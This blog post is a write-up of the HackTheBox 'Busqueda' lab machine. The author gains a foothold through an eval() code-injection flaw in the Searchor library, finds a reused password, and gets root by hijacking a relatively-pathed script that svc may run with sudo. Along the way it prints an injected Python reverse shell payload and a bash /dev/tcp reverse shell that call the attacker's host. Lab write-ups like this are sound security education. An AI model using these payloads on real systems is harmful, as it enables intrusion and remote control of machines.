<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>HackTheBox: Busqueda write-up - bughunter.me</title><meta name="description" content="In this article we'll attempt to solve the Busqueda room from HackTheBox. The solution involves exploiting a Flask website to gain initial access, abusing custom&hellip;"><meta name="generator" content="Publii Open-Source CMS for Static Site"><meta name="theme-color" content="#17181E" media="(prefers-color-scheme: dark)"><meta name="theme-color" content="#D73A42" media="(prefers-color-scheme: light)"><meta name="msapplication-navbutton-color" content="#D73A42"><meta name="apple-mobile-web-app-status-bar-style" content="#D73A42"><link rel="canonical" href="https://e4ld3rs0n.github.io/bughunter-publii/hackthebox-busqueda-write-up/"><link rel="alternate" type="application/atom+xml" href="https://e4ld3rs0n.github.io/bughunter-publii/feed.xml"><link rel="alternate" type="application/json" href="https://e4ld3rs0n.github.io/bughunter-publii/feed.json"><meta property="og:title" content="HackTheBox: Busqueda write-up"><meta property="og:image" content="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/busqueda-walkthrough.png"><meta property="og:image:width" content="900"><meta property="og:image:height" content="300"><meta property="og:site_name" content="bughunter.me"><meta property="og:description" content="In this article we'll attempt to solve the Busqueda room from HackTheBox. The solution involves exploiting a Flask website to gain initial access, abusing custom&hellip;"><meta property="og:url" content="https://e4ld3rs0n.github.io/bughunter-publii//hackthebox-busqueda-write-up/"><meta property="og:type" content="article"><link rel="preload" href="https://e4ld3rs0n.github.io/bughunter-publii/assets/dynamic/fonts/sourcecodepro/sourcecodepro.woff2" as="font" type="font/woff2" crossorigin><link rel="preload" href="https://e4ld3rs0n.github.io/bughunter-publii/assets/dynamic/fonts/sourcecodepro/sourcecodepro-italic.woff2" as="font" type="font/woff2" crossorigin><link rel="stylesheet" href="https://e4ld3rs0n.github.io/bughunter-publii/assets/css/style.css?v=8bcbc4097b8ff9a19ab6ed84a4629ce9"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://e4ld3rs0n.github.io/bughunter-publii/hackthebox-busqueda-write-up/"},"headline":"HackTheBox: Busqueda write-up","datePublished":"2023-04-30T21:52+02:00","dateModified":"2025-01-27T20:30+01:00","image":{"@type":"ImageObject","url":"https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/busqueda-walkthrough.png","height":300,"width":900},"description":"In this article we'll attempt to solve the Busqueda room from HackTheBox. The solution involves exploiting a Flask website to gain initial access, abusing custom&hellip;","author":{"@type":"Person","name":"andrey","url":"https://e4ld3rs0n.github.io/bughunter-publii/authors/andrey/"},"publisher":{"@type":"Organization","name":"andrey"}}</script><noscript><style>img[loading] {
                    opacity: 1;
                }</style></noscript></head><body class="post-template"><div class="container container--center"><header class="header"><div class="header__logo"><a class="logo" href="https://e4ld3rs0n.github.io/bughunter-publii/">bughunter.me</a></div><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/blog/" target="_self">blog</a></li><li><a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/homelab/" target="_self">homelab</a></li><li><a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/ctf/" target="_self">ctf</a></li><li><a href="https://e4ld3rs0n.github.io/bughunter-publii/about-me/" title="About this blog" target="_self">whoami</a></li><li><a href="https://e4ld3rs0n.github.io/bughunter-publii/privacy-policy/" target="_self">privacy-policy</a></li><li><a href="https://e4ld3rs0n.github.io/bughunter-publii//feed.xml" target="_self">rss-feed</a></li></ul></nav></header><main class="content"><article class="post"><header><h1 class="post__title">HackTheBox: Busqueda write-up</h1><div class="post__meta"><time datetime="2023-04-30T21:52" class="post__date">Sunday, 30 April 2023 </time><span class="post__author"><a href="https://e4ld3rs0n.github.io/bughunter-publii/authors/andrey/" class="feed__author">andrey</a></span></div><div class="post__tags"><a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/ctf/" class="invert">ctf</a> <a href="https://e4ld3rs0n.github.io/bughunter-publii/tags/hackthebox/" class="invert">hackthebox</a></div></header><figure class="post__image post__cover"><img src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/busqueda-walkthrough.png" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/busqueda-walkthrough-xs.png 300w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/busqueda-walkthrough-sm.png 480w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/busqueda-walkthrough-md.png 768w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/busqueda-walkthrough-lg.png 1024w" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" loading="eager" height="300" width="900" alt=""></figure><div class="post__entry"><p></p><p>In this article we'll attempt to solve the Busqueda room from HackTheBox. The solution involves exploiting a Flask website to gain initial access, abusing custom python scripts and taking advantage of password reuse. This challenge is rated as <code>easy</code>.</p><p></p><p></p><h2 class="wp-block-heading">Enumeration and initial access</h2><p></p><p></p><p>An initial scan with <code>rustscan</code> revealed two open ports: 22 and 80. I decided to explore the website first which redirected me to <code>http://searcher.htb/</code>. After mapping the domain name to the IP address of the machine in the /etc/hosts file I was able to visit the website.</p><p></p><p></p><p>The application allows users to input arbitrary text, which it then uses to construct a search query on the specified search engine. The query is sent to the server with two parameters: <code>query</code> and <code>engine</code>.</p><p></p><p></p><p>Attempting to input the <code>'</code> character in the search field caused the application to break immediately and display an empty page. This behavior suggests that there is no input sanitization whatsoever.</p><p></p><p></p><p>I also discovered some interesting information located at the bottom of the web page. The website is built with Flask, a Python web framework, and utilizes the Searchor 2.4.0 library to construct its search queries:</p><p></p><p></p><figure class="wp-block-image size-full"><figure class="wp-image-218"><img loading="lazy" src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/searcher.htb_.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/searcher.htb_-xs.png 300w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/searcher.htb_-sm.png 480w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/searcher.htb_-md.png 768w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/searcher.htb_-lg.png 1024w"></figure></figure><p></p><p></p><p>After some research I found out that this version of Searchor has an arbitrary code execution flaw, as detailed on this <a href="https://security.snyk.io/vuln/SNYK-PYTHON-SEARCHOR-3166303" target="_blank" rel="noopener">Snyk page</a>. Taking a look at the GitHub commit related to the vulnerability we can see that the library passes the search query into an <code>eval()</code> statement:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">...def search(engine, query, open, copy):    try:        url = eval(            f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"        )        url = Engine[engine].search(query, copy_url=copy, open_web=open)...</pre><p></p><p></p><p>Let's test this and see if arbitrary code execution is possible. On my local machine I've setup tcpdump to listen for ICMP traffic with the following command:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="bash" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">tcpdump ip proto \\icmp -i tun0</pre><p></p><p></p><p>I then crafted the following payload which should send a couple ping requests to my machine. It begins with <code>',</code> to escape the python function call and ends with <code>#</code> to comment the rest of the line:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">', exec("import subprocess;subprocess.run(['ping','-c','2', 'MY_IP']);"))#</pre><p></p><p></p><figure class="wp-block-image size-large"><figure class="wp-image-221"><img loading="lazy" src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/poc-payload-1024x194.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/poc-payload-1024x194-xs.png 300w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/poc-payload-1024x194-sm.png 480w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/poc-payload-1024x194-md.png 768w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/poc-payload-1024x194-lg.png 1024w"></figure></figure><p></p><p></p><p>We have code execution! Let's run a netcat listener and adapt a reverse shell from <a href="https://www.revshells.com/" target="_blank" rel="noopener">revshells.com</a> (Python #2 looked like a good candidate to me) and try to access the machine:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('MY_IP',MY_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#</pre><p></p><p></p><p>We get our shell as <code>svc</code> user. We can now proceed and use python to get a more stable shell and get the user flag in /home/svc/user.txt.</p><p></p><p></p><h2 class="wp-block-heading">Machine enumeration</h2><p></p><p></p><p>I proceeded with some enumeration of the machine. I found an interesting directory in /opt with some scripts (which we can't read, unfortunately):</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">svc@busqueda:/var/www/app$ ls -alh /opt/scriptstotal 28Kdrwxr-xr-x 3 root root 4.0K Dec 24 18:23 .drwxr-xr-x 4 root root 4.0K Mar  1 10:46 ..-rwx--x--x 1 root root  586 Dec 24 21:23 check-ports.py-rwx--x--x 1 root root  857 Dec 24 21:23 full-checkup.shdrwxr-x--- 8 root root 4.0K Apr  3 15:04 .git-rwx--x--x 1 root root 3.3K Dec 24 21:23 install-flask.sh-rwx--x--x 1 root root 1.9K Dec 24 21:23 system-checkup.py</pre><p></p><p></p><p>In the web application directory I also found a git configuration file with the some credentials for the user <code>cody</code> and the subdomain <code>gitea.searcher.htb</code>, which I added to my /etc/hosts file:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">svc@busqueda:/var/www/app/.git$ cat config [core]	repositoryformatversion = 0	filemode = true	bare = false	logallrefupdates = true[remote "origin"]	url = http://cody:<span class="obfuscated-email" data-user="bz6mkgaz7tcbskhow47" data-domain="yalws.kwsjuzwj.zlt" data-type="text"></span>/cody/Searcher_site.git	fetch = +refs/heads/*:refs/remotes/origin/*[branch "main"]	remote = origin	merge = refs/heads/main</pre><p></p><p></p><p>I also found that this password was reused for the <code>svc</code> account. Using this information I was able to access the machine via SSH and obtain a proper shell. Let's see if <code>sudo</code> is available:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">svc@busqueda:~$ sudo -l[sudo] password for svc: Matching Defaults entries for svc on busqueda:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,    use_ptyUser svc may run the following commands on busqueda:    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</pre><p></p><p></p><p>Interesting. Let's see what this script does:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py somethingUsage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)     docker-ps     : List running docker containers     docker-inspect : Inpect a certain docker container     full-checkup  : Run a full system checkupsvc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkupSomething went wrongsvc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-psCONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS             PORTS                                             NAMES960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 months ago   Up About an hour   127.0.0.1:3000-&gt;3000/tcp, 127.0.0.1:222-&gt;22/tcp   giteaf84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 months ago   Up About an hour   127.0.0.1:3306-&gt;3306/tcp, 33060/tcp               mysql_dbsvc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspectUsage: /opt/scripts/system-checkup.py docker-inspect &lt;format&gt; &lt;container_name&gt;</pre><p></p><p></p><p>After conducting research on the <code>docker inspect</code> command, I found that it is used to extract detailed information about Docker objects, including their configuration details, network settings, metadata, and more. The <code>--format</code> argument can be used to specify the data we want to retrieve, allowing us to extract specific pieces of information. For example, the <code>--format={{.Config}}</code> argument can be used to retrieve the configuration of the object in a Go-style format.</p><p></p><p></p><p>Our custom <code>docker-inspect</code> script is asking for a format and a container name. Let's try to use <code>{{.Config}}</code>:</p><p></p><p></p><figure class="wp-block-image size-full"><figure class="wp-image-228"><img loading="lazy" src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/docker-config-dump.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/docker-config-dump-xs.png 300w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/docker-config-dump-sm.png 480w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/docker-config-dump-md.png 768w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/docker-config-dump-lg.png 1024w"></figure></figure><p></p><p></p><p>We obtained new passwords for the MySQL database and Gitea. I couldn't think of any other way to abuse the scripts so my next step was to explore <code>gitea.searcher.htb</code> which unsurprisingly turned out to be a Gitea instance. Using the credentials we obtained earlier, I logged in as <code>cody</code> but found nothing of particular interest to me except the existence of another user, <code>administrator</code>.</p><p></p><p></p><p>The Gitea password we dumped earlier turned out to be the password for the 'administrator' user account. With these credentials, we are able to access the administrator's repository, where we finally find the source code for the Python scripts we had discovered earlier in the <code>/opt/scripts</code> directory. This allows us to examine the code and potentially identify any vulnerabilities or weaknesses that could be exploited to gain further access to the system.</p><p></p><p></p><figure class="wp-block-image size-full"><figure class="wp-image-236"><img loading="lazy" src="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/admin-gitea-scripts.png" alt="" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/admin-gitea-scripts-xs.png 300w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/admin-gitea-scripts-sm.png 480w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/admin-gitea-scripts-md.png 768w, https://e4ld3rs0n.github.io/bughunter-publii/media/posts/14/responsive/admin-gitea-scripts-lg.png 1024w"></figure></figure><p></p><p></p><p>The <code>system-checkup.py</code> script is particularly interesting. Upon inspecting the code, I discovered why it returned the "Something went wrong" message when it was previously ran. More importantly, I also identified a potential vulnerability that could be exploited to gain a root shell on the system. Take a closer look at how <code>arg_list</code> is constructed:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="shell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">... elif action == 'full-checkup':        try:            arg_list = ['./full-checkup.sh']            print(run_command(arg_list))            print('[+] Done!')        except:            print('Something went wrong')            exit(1)...</pre><p></p><p></p><p>The script uses a relative path to <code>full-checkup.sh</code>. This presents an opportunity to exploit the system by creating a custom <code>full-checkup.sh</code> in a directory that we have full access to with the following reverse shell:</p><p></p><p></p><pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">#!/bin/bashsh -i 5&lt;&gt; /dev/tcp/[MY_IP]/[MY_PORT] 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</pre><p></p><p></p><p>After setting up a netcat listener and executing <code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup</code> I was able to obtain a root shell. All that's left to is get the root flag!</p><p></p></div><footer class="wrapper post__footer"><p class="post__last-updated">This article was updated on Monday, 27 January 2025</p><div class="post__share"><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fe4ld3rs0n.github.io%2Fbughunter-publii%2Fhackthebox-busqueda-write-up%2F" class="js-share invert facebook" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://e4ld3rs0n.github.io/bughunter-publii/assets/svg/svg-map.svg#facebook"/></svg> <span>Facebook</span> </a><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fe4ld3rs0n.github.io%2Fbughunter-publii%2Fhackthebox-busqueda-write-up%2F" class="js-share invert linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://e4ld3rs0n.github.io/bughunter-publii/assets/svg/svg-map.svg#linkedin"/></svg> <span>LinkedIn</span> </a><a href="https://buffer.com/add?text=HackTheBox%3A%20Busqueda%20write-up&amp;url=https%3A%2F%2Fe4ld3rs0n.github.io%2Fbughunter-publii%2Fhackthebox-busqueda-write-up%2F" class="js-share invert buffer" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://e4ld3rs0n.github.io/bughunter-publii/assets/svg/svg-map.svg#buffer"/></svg> <span>Buffer</span> </a><a href="https://api.whatsapp.com/send?text=HackTheBox%3A%20Busqueda%20write-up https%3A%2F%2Fe4ld3rs0n.github.io%2Fbughunter-publii%2Fhackthebox-busqueda-write-up%2F" class="js-share invert whatsapp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://e4ld3rs0n.github.io/bughunter-publii/assets/svg/svg-map.svg#whatsapp"/></svg> <span>WhatsApp</span></a></div></footer><nav class="pagination"><div class="pagination__title"><span>Read other posts</span></div><div class="pagination__buttons"><a href="https://e4ld3rs0n.github.io/bughunter-publii/tryhackme-internal-write-up/" class="btn previous" rel="prev" aria-label="[MISSING TRANSLATION]:  TryHackMe: Internal write-up "><span class="btn__icon">←</span> <span class="btn__text">TryHackMe: Internal write-up</span> </a><a href="https://e4ld3rs0n.github.io/bughunter-publii/hackthebox-monitorstwo-write-up/" class="btn next" rel="next" aria-label="[MISSING TRANSLATION]:  HackTheBox: MonitorsTwo write-up "><span class="btn__text">HackTheBox: MonitorsTwo write-up</span> <span class="btn__icon">→</span></a></div></nav></article><div class="post__comments"></div></main><footer class="footer"><div class="footer__inner"><div class="footer__copyright"><p>© 2023 - 2025 BugHunter</p></div></div></footer></div><script defer="defer" src="https://e4ld3rs0n.github.io/bughunter-publii/assets/js/scripts.min.js?v=c2232aa7558e9517946129d2a1b8c770"></script><script>window.publiiThemeMenuConfig={mobileMenuMode:'overlay',animationSpeed:300,submenuWidth: 'auto',doubleClickTime:500,mobileMenuExpandableSubmenus:true,relatedContainerForOverlayMenuSelector:'.top'};</script><script>var images = document.querySelectorAll('img[loading]');
        for (var i = 0; i < images.length; i++) {
            if (images[i].complete) {
                images[i].classList.add('is-loaded');
            } else {
                images[i].addEventListener('load', function () {
                    this.classList.add('is-loaded');
                }, false);
            }
        }</script><script>class Rot18Encoder { constructor() { this.rotations = [ { from: 'a', to: 'z', offset: 18 }, { from: 'A', to: 'Z', offset: 18 }, { from: '0', to: '9', offset: 5 } ]; } _rotate(char, from, to, offset) { const charCode = char.charCodeAt(0); const fromCode = from.charCodeAt(0); const toCode = to.charCodeAt(0); const range = toCode - fromCode + 1; if (charCode >= fromCode && charCode <= toCode) { const shiftedCode = ((charCode - fromCode + offset) % range) + fromCode; return String.fromCharCode(shiftedCode); } return char; } encode(text) { let encodedText = ""; for(let char of text){ let rotatedChar = char; for (const rot of this.rotations){ rotatedChar = this._rotate(rotatedChar, rot.from, rot.to, rot.offset); } encodedText += rotatedChar; } return encodedText; } decode(text) { let decodedText = ""; for(let char of text){ let rotatedChar = char; for (const rot of this.rotations){ rotatedChar = this._rotate(rotatedChar, rot.from, rot.to, rot.to.charCodeAt(0) - rot.from.charCodeAt(0) + 1 - rot.offset); } decodedText += rotatedChar; } return decodedText; } } class TextProcessor { constructor(encoder){ this.encoder = encoder; } encode(text){ return this.encoder.encode(text); } decode(text){ return this.encoder.decode(text); } } document.addEventListener('DOMContentLoaded', function() { const rot18 = new Rot18Encoder(); const coder = new TextProcessor(rot18); var obfElements = document.querySelectorAll('.obfuscated-email'); obfElements.forEach(function(elem) { var dataType = elem.getAttribute('data-type'); var encodedEmail = elem.getAttribute('data-email'); var user = elem.getAttribute('data-user'); var domain = elem.getAttribute('data-domain'); var decodedEmail = ''; if (user && domain) { decodedEmail = coder.decode(user) + '@' + coder.decode(domain); } else if (encodedEmail) { const parts = encodedEmail.split('@'); if (parts.length === 2) { decodedEmail = coder.decode(parts[0]) + '@' + coder.decode(parts[1]); } else { decodedEmail = encodedEmail; } } if (dataType === 'mailto') { var originalText = elem.textContent.trim(); var a = document.createElement('a'); a.href = 'mailto:' + decodedEmail; if (elem.classList.length > 0) { a.className = elem.className; } if (originalText === '') { a.textContent = decodedEmail; } else { a.textContent = originalText; } elem.parentNode.replaceChild(a, elem); } else if (dataType === 'text') { var textNode = document.createTextNode(decodedEmail); elem.parentNode.replaceChild(textNode, elem); } }); });</script></body></html>